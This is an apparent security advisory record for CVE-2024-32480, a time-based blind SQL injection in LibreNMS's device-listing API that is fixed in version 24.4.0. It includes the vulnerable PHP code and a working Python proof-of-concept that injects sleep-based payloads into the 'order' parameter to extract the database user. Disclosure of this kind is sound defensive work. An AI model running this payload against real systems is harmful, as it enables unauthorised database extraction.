advisory_id: GHSA-jh57-j3vq-h438
datasource_id: github_osv_importer_v2/GHSA-jh57-j3vq-h438
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-jh57-j3vq-h438/GHSA-jh57-j3vq-h438.json
aliases:
  - CVE-2024-32480
summary: "LibreNMS vulnerable to a Time-Based Blind SQL injection leads to database extraction\n\
  ### Summary\nGet a valid API token, make sure you can access api functions, then replace string\
  \ on my PoC code, Test on offical OVA image, it's a old version 23.9.1, but this vulerable\
  \ is also exists on latest version 24.2.0\n\n### Details\nin file `api_functions.php`, line\
  \ 307 for function list_devices\n\n```php\n$order = $request->get('order');\n    $type = $request->get('type');\n\
  \    $query = $request->get('query');\n    $param = [];\n\n    if (empty($order)) {\n    \
  \    $order = 'hostname';\n    }\n\n    if (stristr($order, ' desc') === false && stristr($order,\
  \ ' asc') === false) {\n        $order = 'd.`' . $order . '` ASC';\n    }\n    /* ... */\n\
  \    $devices = [];\n    $dev_query = \"SELECT $select FROM `devices` AS d $join WHERE $sql\
  \ GROUP BY d.`hostname` ORDER BY $order\";\n    foreach (dbFetchRows($dev_query, $param) as\
  \ $device) {\n```\nThe \"order\" parameter is obtained from $request. After performing a string\
  \ check, the value is directly incorporated into an SQL statement and concatenated, resulting\
  \ in a SQL injection vulnerability.\n\n### PoC\nFor example. this PoC is get current db user\n\
  ```python\nimport string\nimport requests\n\nheaders = {\n\t'X-Auth-Token': 'token_string'\n\
  }\nreq = requests.Session()\npayloads = '_-@.,' + string.digits + string.ascii_letters\nurl\
  \ = 'http://host/api/v0/devices?order=device_id` and if(ascii(substr(user(),%d,1))=%d,sleep(5),1)\
  \ and d.`device_id'\nresult = 'user: '\nfor i in range(10):\n\tfor payload in payloads:\n\t\
  \ttry:\n\t\t\treq.get(url % (i+1, ord(payload)), headers=headers, timeout=3)\n\t\texcept requests.exceptions.ReadTimeout\
  \ as ex:\n\t\t\tresult += payload\n\t\t\tprint(result),\n\t\texcept Exception as e:\n\t\t\t\
  pass\n```\n![QQ截图20240306181404](https://github.com/librenms/librenms/assets/11938870/017cc413-ce1e-45a2-b0f1-a0ae83bbbeee)\n\
  \n### Impact\nAttacker can extract whole database"
impacted_packages:
  - purl: pkg:composer/librenms/librenms
    affected_versions: vers:composer/<24.4.0
    fixed_versions: vers:composer/24.4.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.2'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-jh57-j3vq-h438/GHSA-jh57-j3vq-h438.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-89
references:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/83fe4b10c440d69a47fe2f8616e290ba2bd3a27c
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-jh57-j3vq-h438
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-32480
    reference_type:
    reference_id: CVE-2024-32480
